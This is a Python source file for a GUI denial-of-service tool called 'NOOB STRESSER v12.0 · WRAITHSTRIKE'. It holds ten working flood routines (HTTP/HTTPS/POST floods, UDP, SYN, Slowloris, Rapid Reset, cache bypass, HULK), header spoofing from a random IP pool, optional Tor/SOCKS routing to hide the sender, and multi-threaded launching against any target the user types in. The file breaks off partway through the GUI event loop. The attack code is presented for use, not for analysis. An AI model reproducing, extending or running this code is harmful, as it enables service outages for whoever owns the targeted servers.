"""
NOOB STRESSER v12.0 — WRAITHSTRIKE
Pygame GUI — pseudo-3D red hacker style
"""

import pygame
import pygame.gfxdraw
import threading
import socket
import ssl
import time
import random
import string
import struct
import gc
import sys
import math
import subprocess

# ── auto-install PySocks ──────────────────────────────────────────────────────
def _ensure_socks():
    try:
        import socks
        return True
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "PySocks", "-q"],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import socks
            return True
        except Exception:
            return False

SOCKS_OK = _ensure_socks()
if SOCKS_OK:
    import socks

# ── optimize ──────────────────────────────────────────────────────────────────
def _optimize():
    threading.stack_size(65536)
    socket.setdefaulttimeout(2)
    gc.collect(); gc.disable()
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.winmm.timeBeginPeriod(1)
        except: pass
_optimize()

# ── proxy globals ──────────────────────────────────────────────────────────────
_PROXY_ENABLED = False
_PROXY_HOST    = "127.0.0.1"
_PROXY_PORT    = 9050
_PROXY_TYPE    = "socks5"

# ── IP pool ────────────────────────────────────────────────────────────────────
_IP_POOL = []
def _build_pool(n=1000):
    seen = set()
    while len(_IP_POOL) < n:
        a = random.randint(1, 254)
        if a in (10,127,172,192): continue
        ip = f"{a}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        if ip not in seen:
            seen.add(ip); _IP_POOL.append(ip)
_build_pool()
def _rip(): return random.choice(_IP_POOL)

# ── socket factory ─────────────────────────────────────────────────────────────
def _make_socket(udp=False):
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    if not udp and _PROXY_ENABLED and SOCKS_OK:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        pt = socks.SOCKS5 if _PROXY_TYPE=="socks5" else (socks.SOCKS4 if _PROXY_TYPE=="socks4" else socks.HTTP)
        try: s.set_proxy(pt, _PROXY_HOST, _PROXY_PORT)
        except: s.close(); s = socket.socket(socket.AF_INET, kind)
        return s
    s = socket.socket(socket.AF_INET, kind)
    if not udp:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
    else:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
    return s

# ── headers ────────────────────────────────────────────────────────────────────
AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.7.1", "python-requests/2.31.0",
]
PATHS = ["/","/?"+random.randbytes(4).hex(),"/index.html","/login","/api/v1/status",
         "/wp-admin","/admin","/.env","/api/data","/dashboard","/search","/checkout"]
REFERERS = ["https://www.google.com/search?q=","https://www.bing.com/search?q=",
            "https://www.facebook.com/","https://www.reddit.com/r/","https://t.co/"]

def _fake_headers():
    f1,f2,f3 = _rip(),_rip(),_rip()
    ref = random.choice(REFERERS) + "".join(random.choices(string.ascii_lowercase,k=6))
    return (f"X-Forwarded-For: {f1}, {f2}, {f3}\r\nX-Real-IP: {f1}\r\n"
            f"CF-Connecting-IP: {f1}\r\nTrue-Client-IP: {f1}\r\n"
            f"Forwarded: for={f1};proto=https;by={f2}\r\nVia: 1.1 {f2} (squid)\r\n"
            f"Referer: {ref}\r\nDNT: {random.randint(0,1)}\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Sec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\n"
            f"Cookie: session={random.randbytes(16).hex()}\r\nTE: trailers\r\n")

def _req(host, keep=True, method="GET"):
    rand_k = "".join(random.choices(string.ascii_lowercase+string.digits,k=8))
    path   = random.choice(PATHS)+f"?{rand_k}={random.randint(1,999999)}"
    conn   = "keep-alive" if keep else "close"
    enc    = random.choice(["gzip, deflate, br","gzip, deflate"])
    if method=="POST":
        body = "&".join(f"d{i}={random.randbytes(8).hex()}" for i in range(6)).encode()
        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"User-Agent: {random.choice(AGENTS)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\nCache-Control: no-cache\r\n"
                f"Connection: {conn}\r\n"+_fake_headers()+"\r\n").encode()+body
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {random.choice(AGENTS)}\r\n"
            f"Accept: text/html,*/*;q=0.9\r\nAccept-Encoding: {enc}\r\n"
            f"Cache-Control: no-cache, no-store\r\nRange: bytes=0-\r\n"
            f"Connection: {conn}\r\n"+_fake_headers()+"\r\n").encode()

# ── attack functions ──────────────────────────────────────────────────────────
def _http_flood(host,port,stats,stop_ev):
    while not stop_ev.is_set():
        try:
            s=_make_socket(); s.settimeout(2); s.connect((host,port))
            p=_req(host,method=random.choice(["GET","GET","POST"]))
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(p); stats["sent"]+=1
            s.close()
        except: stats["errors"]+=1

def _https_flood(host,port,stats,stop_ev):
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
    except: pass
    while not stop_ev.is_set():
        try:
            raw=_make_socket(); raw.settimeout(2); raw.connect((host,port))
            s=ctx.wrap_socket(raw,server_hostname=host)
            p=_req(host,method=random.choice(["GET","POST"]))
            for _ in range(150):
                if stop_ev.is_set(): break
                s.send(p); stats["sent"]+=1
            s.close()
        except: stats["errors"]+=1

def _post_flood(host,port,stats,stop_ev):
    while not stop_ev.is_set():
        try:
            s=_make_socket(); s.settimeout(2); s.connect((host,port))
            p=_req(host,method="POST")
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(p); stats["sent"]+=1
            s.close()
        except: stats["errors"]+=1

def _udp_flood(host,port,stats,stop_ev):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    s=_make_socket(udp=True)
    sizes=list(range(512,65508,512))
    while not stop_ev.is_set():
        try:
            s.sendto(random.randbytes(random.choice(sizes)),(ip,port)); stats["sent"]+=1
        except: stats["errors"]+=1

def _syn_flood(host,port,stats,stop_ev):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    while not stop_ev.is_set():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.3)
            s.connect_ex((ip,port)); stats["sent"]+=1
            s.setsockopt(socket.SOL_SOCKET,socket.SO_LINGER,struct.pack('ii',1,0)); s.close()
        except: stats["errors"]+=1

def _slowloris(host,port,stats,stop_ev):
    sockets=[]
    for _ in range(400):
        if stop_ev.is_set(): break
        try:
            s=_make_socket(); s.settimeout(4); s.connect((host,port))
            s.send((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                    f"X-Forwarded-For: {_rip()}\r\nUser-Agent: {random.choice(AGENTS)}\r\n").encode())
            sockets.append(s); stats["sent"]+=1
        except: pass
    while not stop_ev.is_set():
        for s in list(sockets):
            try: s.send(f"X-a: {_rip()}\r\n".encode()); stats["sent"]+=1
            except:
                sockets.remove(s); stats["errors"]+=1
                try:
                    ns=_make_socket(); ns.settimeout(4); ns.connect((host,port))
                    ns.send((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                             f"X-Forwarded-For: {_rip()}\r\n").encode())
                    sockets.append(ns)
                except: pass
        time.sleep(8)
    for s in sockets:
        try: s.close()
        except: pass

def _rapid_reset(host,port,stats,stop_ev):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    while not stop_ev.is_set():
        try:
            s=_make_socket(); s.settimeout(0.5); s.connect((ip,port))
            s.send(_req(host,keep=False)); stats["sent"]+=1
            s.setsockopt(socket.SOL_SOCKET,socket.SO_LINGER,struct.pack('ii',1,0)); s.close()
        except: stats["errors"]+=1

def _cache_bypass(host,port,stats,stop_ev):
    while not stop_ev.is_set():
        try:
            s=_make_socket(); s.settimeout(2); s.connect((host,port))
            rand="".join(random.choices(string.ascii_lowercase+string.digits,k=12))
            req=(f"GET /?nocache={rand} HTTP/1.1\r\nHost: {host}\r\n"
                 f"Cache-Control: no-cache, no-store\r\nPragma: no-cache\r\n"
                 f"User-Agent: {random.choice(AGENTS)}\r\n"+_fake_headers()+"\r\n").encode()
            for _ in range(100):
                if stop_ev.is_set(): break
                s.send(req); stats["sent"]+=1
            s.close()
        except: stats["errors"]+=1

def _hulk(host,port,stats,stop_ev):
    while not stop_ev.is_set():
        try:
            s=_make_socket(); s.settimeout(2); s.connect((host,port))
            rand="".join(random.choices(string.ascii_lowercase+string.digits,k=10))
            req=(f"GET /?{rand}={rand} HTTP/1.1\r\nHost: {host}\r\n"
                 f"User-Agent: {random.choice(AGENTS)}\r\n"
                 f"Referer: https://www.google.com/?q={rand}\r\n"
                 f"Connection: keep-alive\r\n"+_fake_headers()+"\r\n").encode()
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(req); stats["sent"]+=1
            s.close()
        except: stats["errors"]+=1

def _garbage(host,port,stats,stop_ev):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    s=_make_socket(udp=True)
    while not stop_ev.is_set():
        try: s.sendto(random.randbytes(65507),(ip,port)); stats["sent"]+=1
        except: stats["errors"]+=1

ATTACK_MAP = {
    "HTTP Flood":   _http_flood,
    "HTTPS Flood":  _https_flood,
    "POST Flood":   _post_flood,
    "UDP Flood":    _udp_flood,
    "SYN Flood":    _syn_flood,
    "Slowloris":    _slowloris,
    "Rapid Reset":  _rapid_reset,
    "Cache Bypass": _cache_bypass,
    "HULK":         _hulk,
    "Garbage":      _garbage,
}

def _spawn(fn,host,port,count,stop_ev,stats):
    batch=150; spawned=0; failed=0
    for i in range(0,count,batch):
        if stop_ev.is_set(): break
        b=min(batch,count-i)
        for _ in range(b):
            try:
                t=threading.Thread(target=fn,args=(host,port,stats,stop_ev),daemon=True)
                t.start(); spawned+=1; failed=0
            except: failed+=1; (lambda:None if failed<3 else exit)()
        time.sleep(0.01+spawned/100000)

# ═══════════════════════════════════════════════════════════════════════════════
# PYGAME GUI
# ═══════════════════════════════════════════════════════════════════════════════

# ── palette ───────────────────────────────────────────────────────────────────
C_BG       = (6,   4,   4)
C_PANEL    = (14,  10,  10)
C_PANEL2   = (20,  14,  14)
C_RED      = (220, 20,  20)
C_RED_DIM  = (120, 10,  10)
C_RED_GLOW = (255, 50,  50)
C_BORDER   = (60,  10,  10)
C_BORDER_H = (180, 30,  30)
C_FG       = (210, 200, 200)
C_DIM      = (90,  70,  70)
C_GREEN    = (0,   180, 80)
C_CYAN     = (0,   190, 220)
C_YELLOW   = (220, 180, 0)
C_BLACK    = (0,   0,   0)
C_SHADOW   = (2,   1,   1)

W, H = 1000, 750

# ── draw helpers ──────────────────────────────────────────────────────────────
def draw_rect_3d(surf, rect, color, depth=4, pressed=False):
    """Pseudo-3D raised/pressed panel với bevel."""
    x, y, w, h = rect
    # shadow
    pygame.draw.rect(surf, C_SHADOW, (x+depth, y+depth, w, h), border_radius=6)
    # body
    pygame.draw.rect(surf, color, rect, border_radius=6)
    # bevel highlight (top-left nếu raised, bottom-right nếu pressed)
    if not pressed:
        hl = tuple(min(255, c+40) for c in color)
        sh = tuple(max(0, c-40) for c in color)
    else:
        hl = tuple(max(0, c-40) for c in color)
        sh = tuple(min(255, c+40) for c in color)
    # top edge
    pygame.draw.line(surf, hl, (x+6, y+1), (x+w-7, y+1), 1)
    # left edge
    pygame.draw.line(surf, hl, (x+1, y+6), (x+1, y+h-7), 1)
    # bottom edge
    pygame.draw.line(surf, sh, (x+6, y+h-2), (x+w-7, y+h-2), 1)
    # right edge
    pygame.draw.line(surf, sh, (x+w-2, y+6), (x+w-2, y+h-7), 1)
    # outer border
    pygame.draw.rect(surf, C_BORDER, rect, 1, border_radius=6)

def draw_glow_rect(surf, rect, color, radius=8, alpha=60):
    """Glow halo xung quanh rect."""
    x,y,w,h = rect
    glow_surf = pygame.Surface((w+radius*2, h+radius*2), pygame.SRCALPHA)
    for i in range(radius, 0, -1):
        a = int(alpha * (i/radius) ** 1.5)
        col = (*color, a)
        pygame.draw.rect(glow_surf, col,
                         (radius-i, radius-i, w+i*2, h+i*2),
                         border_radius=6+i)
    surf.blit(glow_surf, (x-radius, y-radius))

def draw_text_glow(surf, text, font, color, pos, glow_color=None, glow_r=4):
    """Text với glow effect."""
    gc_color = glow_color or color
    cx, cy = pos
    glow_surf = pygame.Surface((surf.get_width(), surf.get_height()), pygame.SRCALPHA)
    for dx in range(-glow_r, glow_r+1, 2):
        for dy in range(-glow_r, glow_r+1, 2):
            if dx==0 and dy==0: continue
            a = int(80 * (1 - math.sqrt(dx*dx+dy*dy)/(glow_r*1.4)))
            if a <= 0: continue
            gs = font.render(text, True, (*gc_color[:3], a))
            glow_surf.blit(gs, (cx+dx, cy+dy))
    surf.blit(glow_surf, (0,0))
    txt = font.render(text, True, color)
    surf.blit(txt, (cx, cy))

def draw_circuit_bg(surf, seed=42):
    """Circuit board subtle pattern."""
    rng = random.Random(seed)
    for _ in range(80):
        x = rng.randint(0, W)
        y = rng.randint(0, H)
        length = rng.randint(20, 120)
        horizontal = rng.choice([True, False])
        col = (rng.randint(15,25), rng.randint(5,10), rng.randint(5,10))
        if horizontal:
            pygame.draw.line(surf, col, (x,y), (x+length,y), 1)
            if rng.random() > 0.5:
                pygame.draw.circle(surf, col, (x+length, y), 2)
        else:
            pygame.draw.line(surf, col, (x,y), (x,y+length), 1)
            if rng.random() > 0.5:
                pygame.draw.circle(surf, col, (x, y+length), 2)

def draw_scanlines(surf):
    """Scanline overlay tinh tế."""
    scan = pygame.Surface((W, H), pygame.SRCALPHA)
    for y in range(0, H, 4):
        pygame.draw.line(scan, (0,0,0,18), (0,y), (W,y))
    surf.blit(scan, (0,0))

def draw_progress_bar(surf, rect, pct, color=C_RED):
    x,y,w,h = rect
    # track
    pygame.draw.rect(surf, C_PANEL, rect, border_radius=4)
    pygame.draw.rect(surf, C_BORDER, rect, 1, border_radius=4)
    # fill
    fill_w = int(w * pct)
    if fill_w > 4:
        fill_rect = (x, y, fill_w, h)
        # gradient effect — brighter at leading edge
        pygame.draw.rect(surf, C_RED_DIM, fill_rect, border_radius=4)
        pygame.draw.rect(surf, color, (x, y, max(fill_w-8,1), h), border_radius=4)
        # bright tip
        if fill_w > 10:
            pygame.draw.rect(surf, C_RED_GLOW, (x+fill_w-8, y+1, 6, h-2), border_radius=3)
        # glow
        draw_glow_rect(surf, fill_rect, color, radius=4, alpha=40)

# ── input box ─────────────────────────────────────────────────────────────────
class InputBox:
    def __init__(self, x, y, w, h, text="", label=""):
        self.rect = pygame.Rect(x, y, w, h)
        self.text = text
        self.label = label
        self.active = False
        self.cursor_vis = True
        self.cursor_t = 0

    def handle_event(self, ev):
        if ev.type == pygame.MOUSEBUTTONDOWN:
            self.active = self.rect.collidepoint(ev.pos)
        if ev.type == pygame.KEYDOWN and self.active:
            if ev.key == pygame.K_BACKSPACE:
                self.text = self.text[:-1]
            elif ev.unicode and ev.unicode.isprintable():
                self.text += ev.unicode

    def update(self, dt):
        self.cursor_t += dt
        if self.cursor_t > 500:
            self.cursor_vis = not self.cursor_vis
            self.cursor_t = 0

    def draw(self, surf, font_small, font_label):
        x,y,w,h = self.rect
        col = C_PANEL2 if not self.active else (28,18,18)
        border = C_BORDER_H if self.active else C_BORDER
        # label
        lbl = font_label.render(self.label, True, C_DIM)
        surf.blit(lbl, (x, y-16))
        # box 3D
        pygame.draw.rect(surf, C_SHADOW, (x+2,y+2,w,h), border_radius=4)
        pygame.draw.rect(surf, col, self.rect, border_radius=4)
        pygame.draw.rect(surf, border, self.rect, 1, border_radius=4)
        # inner highlight
        pygame.draw.line(surf, (35,25,25), (x+4,y+1), (x+w-5,y+1))
        if self.active:
            draw_glow_rect(surf, (x,y,w,h), C_RED, radius=5, alpha=35)
        # text
        display = self.text + ("|" if self.active and self.cursor_vis else "")
        txt = font_small.render(display, True, C_FG)
        surf.blit(txt, (x+8, y+h//2 - txt.get_height()//2))

# ── mode card ─────────────────────────────────────────────────────────────────
class ModeCard:
    def __init__(self, x, y, w, h, name, layer, stars):
        self.rect = pygame.Rect(x, y, w, h)
        self.name = name
        self.layer = layer
        self.stars = stars
        self.selected = False
        self.hover = False

    def handle_event(self, ev):
        if ev.type == pygame.MOUSEMOTION:
            self.hover = self.rect.collidepoint(ev.pos)
        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
            if self.rect.collidepoint(ev.pos):
                return True
        return False

    def draw(self, surf, font_name, font_meta):
        x,y,w,h = self.rect
        if self.selected:
            col = (30, 8, 8)
            border = C_RED
            draw_glow_rect(surf, (x,y,w,h), C_RED, radius=8, alpha=50)
        elif self.hover:
            col = (22, 12, 12)
            border = C_RED_DIM
        else:
            col = C_PANEL
            border = C_BORDER
        draw_rect_3d(surf, (x,y,w,h), col, depth=3, pressed=self.selected)
        pygame.draw.rect(surf, border, self.rect, 1, border_radius=6)

        # layer badge
        lyr_col = C_GREEN if self.layer=="L7" else C_CYAN
        lyr_surf = font_meta.render(self.layer, True, lyr_col)
        surf.blit(lyr_surf, (x+6, y+4))

        # name
        name_col = C_RED_GLOW if self.selected else (C_FG if not self.hover else C_RED_GLOW)
        n = font_name.render(self.name, True, name_col)
        surf.blit(n, (x+6, y+h//2 - n.get_height()//2))

        # stars
        stars_col = C_YELLOW if self.selected else C_DIM
        s = font_meta.render(self.stars, True, stars_col)
        surf.blit(s, (x+w - s.get_width() - 6, y+h-s.get_height()-4))

# ── log panel ─────────────────────────────────────────────────────────────────
class LogPanel:
    def __init__(self, x, y, w, h):
        self.rect = (x,y,w,h)
        self.lines = []
        self.max_lines = 60

    def add(self, msg, tag="info"):
        ts = time.strftime("%H:%M:%S")
        self.lines.append((f"[{ts}] {msg}", tag))
        if len(self.lines) > self.max_lines:
            self.lines.pop(0)

    def draw(self, surf, font):
        x,y,w,h = self.rect
        pygame.draw.rect(surf, C_PANEL, self.rect, border_radius=4)
        pygame.draw.rect(surf, C_BORDER, self.rect, 1, border_radius=4)
        # inner shadow top
        pygame.draw.line(surf, C_SHADOW, (x+4,y+1), (x+w-5,y+1))

        tag_colors = {
            "ok":    C_GREEN,
            "error": C_RED_GLOW,
            "warn":  C_YELLOW,
            "stat":  C_CYAN,
            "info":  C_DIM,
        }
        line_h = font.get_height() + 2
        max_visible = (h - 10) // line_h
        visible = self.lines[-max_visible:]
        for i, (text, tag) in enumerate(visible):
            col = tag_colors.get(tag, C_DIM)
            txt = font.render(text, True, col)
            surf.blit(txt, (x+8, y+5 + i*line_h))

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN APP
# ═══════════════════════════════════════════════════════════════════════════════
class NoobApp:
    MODES = [
        ("HTTP Flood",   "L7", "★★★★☆"),
        ("HTTPS Flood",  "L7", "★★★★★"),
        ("POST Flood",   "L7", "★★★★☆"),
        ("UDP Flood",    "L4", "★★★☆☆"),
        ("SYN Flood",    "L4", "★★★☆☆"),
        ("Slowloris",    "L7", "★★★★☆"),
        ("Rapid Reset",  "L4", "★★★☆☆"),
        ("Cache Bypass", "L7", "★★★★☆"),
        ("HULK",         "L7", "★★★★★"),
        ("Garbage",      "L4", "★★★☆☆"),
    ]

    def __init__(self):
        pygame.init()
        pygame.display.set_caption("NOOB STRESSER v12.0 · WRAITHSTRIKE")
        self.surf = pygame.display.set_mode((W, H), pygame.RESIZABLE)
        self.clock = pygame.time.Clock()

        # fonts
        self.f_title  = pygame.font.SysFont("Consolas", 26, bold=True)
        self.f_sub    = pygame.font.SysFont("Consolas", 10)
        self.f_mode   = pygame.font.SysFont("Consolas", 10, bold=True)
        self.f_meta   = pygame.font.SysFont("Consolas", 9)
        self.f_label  = pygame.font.SysFont("Consolas", 9)
        self.f_stat_l = pygame.font.SysFont("Consolas", 22, bold=True)
        self.f_stat_s = pygame.font.SysFont("Consolas", 9)
        self.f_btn    = pygame.font.SysFont("Consolas", 14, bold=True)
        self.f_log    = pygame.font.SysFont("Consolas", 9)

        # attack state
        self._running  = False
        self._stop_ev  = threading.Event()
        self._stats    = {"sent":0,"errors":0}
        self._start_ts = 0
        self._duration = 60
        self._btn_pressed = False

        # bg (baked once)
        self._bg = pygame.Surface((W, H))
        self._bg.fill(C_BG)
        draw_circuit_bg(self._bg)

        # mode cards — 5 per row
        self._cards = []
        cw, ch = 183, 48
        cx0, cy0 = 14, 178
        for i,(name,layer,stars) in enumerate(self.MODES):
            r,c = divmod(i,5)
            self._cards.append(ModeCard(
                cx0 + c*(cw+4), cy0 + r*(ch+4), cw, ch, name, layer, stars
            ))
        self._cards[0].selected = True

        # inputs
        self.inp_target   = InputBox(14,  396, 300, 30, "your-server.com", "TARGET")
        self.inp_port     = InputBox(324, 396, 80,  30, "443",             "PORT")
        self.inp_threads  = InputBox(414, 396, 90,  30, "500",             "THREADS")
        self.inp_duration = InputBox(514, 396, 90,  30, "60",              "DURATION (s)")
        self.inp_proxy_h  = InputBox(624, 396, 140, 30, "127.0.0.1",       "PROXY HOST")
        self.inp_proxy_p  = InputBox(774, 396, 70,  30, "9050",            "PROXY PORT")
        self._inputs = [self.inp_target, self.inp_port, self.inp_threads,
                        self.inp_duration, self.inp_proxy_h, self.inp_proxy_p]

        # proxy toggle
        self._proxy_on = False

        # launch button rect
        self._btn_rect = pygame.Rect(14, 450, 250, 48)

        # stats boxes
        self._stat_boxes = [
            (pygame.Rect(14,  518, 220, 70), "SENT",   "sent",   C_RED_GLOW),
            (pygame.Rect(244, 518, 220, 70), "ERRORS", "errors", (255,100,0)),
            (pygame.Rect(474, 518, 220, 70), "RPS",    "rps",    C_GREEN),
            (pygame.Rect(704, 518, 220, 70), "REMAIN", "remain", C_CYAN),
        ]

        # progress bar
        self._pb_rect = (14, 598, 972, 12)

        # log
        self._log = LogPanel(14, 622, 972, 112)
        self._log.add("[NOOB STRESSER v12.0 · WRAITHSTRIKE] ready", "ok")
        self._log.add("[SYS] select mode → config → LAUNCH", "info")
        socks_msg = "PySocks OK — proxy/Tor sẵn sàng" if SOCKS_OK else "[!] PySocks FAILED — pip install PySocks"
        self._log.add(socks_msg, "ok" if SOCKS_OK else "error")

        # animation
        self._anim_t = 0
        self._pulse = 0.0

    # ── selected mode ─────────────────────────────────────────────────────────
    def _selected_mode(self):
        for c in self._cards:
            if c.selected: return c.name
        return "HTTP Flood"

    # ── attack control ────────────────────────────────────────────────────────
    def _start(self):
        host = self.inp_target.text.strip()
        if not host: self._log.add("[!] Nhập target", "error"); return
        try: port = int(self.inp_port.text)
        except: port = 80
        try: threads = max(1, min(int(self.inp_threads.text), 2000))
        except: threads = 100
        try: duration = max(1, int(self.inp_duration.text))
        except: duration = 60

        global _PROXY_ENABLED, _PROXY_HOST, _PROXY_PORT
        _PROXY_ENABLED = self._proxy_on
        _PROXY_HOST    = self.inp_proxy_h.text.strip() or "127.0.0.1"
        try: _PROXY_PORT = int(self.inp_proxy_p.text)
        except: _PROXY_PORT = 9050

        mode = self._selected_mode()
        fn   = ATTACK_MAP.get(mode)
        if not fn: return

        self._running  = True
        self._stop_ev  = threading.Event()
        self._stats    = {"sent":0,"errors":0}
        self._start_ts = time.time()
        self._duration = duration

        proxy_info = f" | proxy={_PROXY_HOST}:{_PROXY_PORT}" if _PROXY_ENABLED else ""
        self._log.add(f"[▶] {threads}t → {host}:{port} | {duration}s | {mode}{proxy_info}", "ok")

        threading.Thread(target=_spawn, args=(fn,host,port,threads,self._stop_ev,self._stats), daemon=True).start()

    def _stop(self):
        self._stop_ev.set()
        self._running = False
        gc.enable()
        elapsed = max(time.time()-self._start_ts, 0.1)
        rps = int(self._stats["sent"]/elapsed)
        self._log.add(f"[■] Done — sent:{self._stats['sent']:,} err:{self._stats['errors']:,} avg:{rps} rps", "ok")

    # ── draw ──────────────────────────────────────────────────────────────────
    def _draw(self):
        self.surf.blit(self._bg, (0,0))

        # ── header ────────────────────────────────────────────────────────────
        # header panel
        draw_rect_3d(self.surf, (0,0,W,70), (12,4,4), depth=0)
        pygame.draw.line(self.surf, C_BORDER, (0,70), (W,70))

        # skull accent lines
        for i in range(3):
            alpha = 40 - i*12
            col = (C_RED[0], C_RED[1], C_RED[2])
            pygame.draw.line(self.surf, col, (0, 69-i), (W, 69-i))

        # title with glow
        draw_text_glow(self.surf,
                       "☠  NOOB STRESSER  ☠",
                       self.f_title, C_RED_GLOW, (W//2 - 165, 10),
                       glow_color=C_RED, glow_r=6)

        # animated pulse dot
        pulse = (math.sin(self._anim_t * 0.003) + 1) / 2
        pcol = tuple(int(C_RED_DIM[i] + (C_RED_GLOW[i]-C_RED_DIM[i])*pulse) for i in range(3))
        pygame.draw.circle(self.surf, pcol, (W-20, 20), 6)
        draw_glow_rect(self.surf, (W-26,14,12,12), pcol, radius=6, alpha=60)

        sub = self.f_sub.render("v12.0  ·  WRAITHSTRIKE  ·  10 MODES  ·  PYGAME EDITION", True, C_DIM)
        self.surf.blit(sub, (W//2 - sub.get_width()//2, 44))

        # ── section label: SELECT MODE ─────────────────────────────────────────
        self._draw_section_label(14, 158, "◈  SELECT MODE")

        # ── mode cards ────────────────────────────────────────────────────────
        for card in self._cards:
            card.draw(self.surf, self.f_mode, self.f_meta)

        # ── section label: CONFIG ─────────────────────────────────────────────
        self._draw_section_label(14, 360, "◈  CONFIG")

        # ── inputs ────────────────────────────────────────────────────────────
        for inp in self._inputs:
            inp.draw(self.surf, self.f_mode, self.f_label)

        # proxy toggle button
        px, py = 14, 434
        ptxt = f"[{'✓' if self._proxy_on else ' '}] PROXY / TOR"
        pcol = C_RED_GLOW if self._proxy_on else C_DIM
        p_surf = self.f_meta.render(ptxt, True, pcol)
        self.surf.blit(p_surf, (px, py))

        # ── launch button ─────────────────────────────────────────────────────
        if self._running:
            btn_col = (20, 20, 20)
            btn_border = C_DIM
            btn_txt = "■  STOP"
            btn_tcol = C_DIM
        else:
            btn_col = (18, 6, 6)
            btn_border = C_RED
            btn_txt = "▶  LAUNCH"
            btn_tcol = C_RED_GLOW
            # glow when idle
            draw_glow_rect(self.surf, tuple(self._btn_rect), C_RED, radius=10,
                           alpha=int(30 + 20*((math.sin(self._anim_t*0.004)+1)/2)))

        draw_rect_3d(self.surf, tuple(self._btn_rect), btn_col, depth=4,
                     pressed=self._btn_pressed)
        pygame.draw.rect(self.surf, btn_border, self._btn_rect, 1, border_radius=6)
        bt = self.f_btn.render(btn_txt, True, btn_tcol)
        bx = self._btn_rect.x + self._btn_rect.w//2 - bt.get_width()//2
        by = self._btn_rect.y + self._btn_rect.h//2 - bt.get_height()//2
        if self._btn_pressed: bx+=1; by+=1
        self.surf.blit(bt, (bx, by))

        # ── stat boxes ────────────────────────────────────────────────────────
        elapsed = time.time()-self._start_ts if self._running else 0
        rps = int(self._stats["sent"]/max(elapsed,0.1)) if self._running else 0
        remain = max(0, self._duration - elapsed) if self._running else 0

        vals = {
            "sent":   f"{self._stats['sent']:,}",
            "errors": f"{self._stats['errors']:,}",
            "rps":    f"{rps:,}",
            "remain": f"{int(remain)}s",
        }

        self._draw_section_label(14, 500, "◈  STATS")

        for rect, label, key, col in self._stat_boxes:
            draw_rect_3d(self.surf, tuple(rect), C_PANEL, depth=3)
            pygame.draw.rect(self.surf, C_BORDER, rect, 1, border_radius=6)
            lbl = self.f_stat_s.render(label, True, C_DIM)
            self.surf.blit(lbl, (rect.x+8, rect.y+6))
            val = self.f_stat_l.render(vals[key], True, col)
            vx = rect.x + rect.w//2 - val.get_width()//2
            vy = rect.y + rect.h//2
            self.surf.blit(val, (vx, vy))
            if self._running:
                draw_glow_rect(self.surf, tuple(rect), col, radius=5, alpha=20)

        # ── progress bar ──────────────────────────────────────────────────────
        pct = min(elapsed/max(self._duration,1), 1.0) if self._running else 0
        draw_progress_bar(self.surf, self._pb_rect, pct)

        # ── log ───────────────────────────────────────────────────────────────
        self._draw_section_label(14, 610, "◈  LOG")
        self._log.draw(self.surf, self.f_log)

        # scanlines on top
        draw_scanlines(self.surf)

        pygame.display.flip()

    def _draw_section_label(self, x, y, text):
        pygame.draw.line(self.surf, C_BORDER, (x, y+7), (x+972, y+7))
        lbl = self.f_meta.render(text, True, C_RED)
        bg = pygame.Surface((lbl.get_width()+8, lbl.get_height()), pygame.SRCALPHA)
        bg.fill((*C_BG, 255))
        self.surf.blit(bg, (x+8, y))
        self.surf.blit(lbl, (x+12, y))

    # ── run loop ──────────────────────────────────────────────────────────────
    def run(self):
        last_stat_log = 0
        while True:
            dt = self.clock.tick(60)
            self._anim_t += dt

            for ev in pygame.event.get():
                if ev.type == pygame.QUIT:
                    if self._running: self._stop_ev.set()
                    pygame.quit(); sys.exit()

                # inputs
                for inp in self._inputs:
                    inp.handle_event(ev)
                for inp in self._inputs:
                    inp.update(dt)

                # mode cards
                for card in self._cards:
                    if card.handle_event(ev):
                        for c in self._cards: c.selected = False
                        card.selected = True

                # proxy toggle
                if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                    px,py = 14, 434
                    ptxt_w = 160
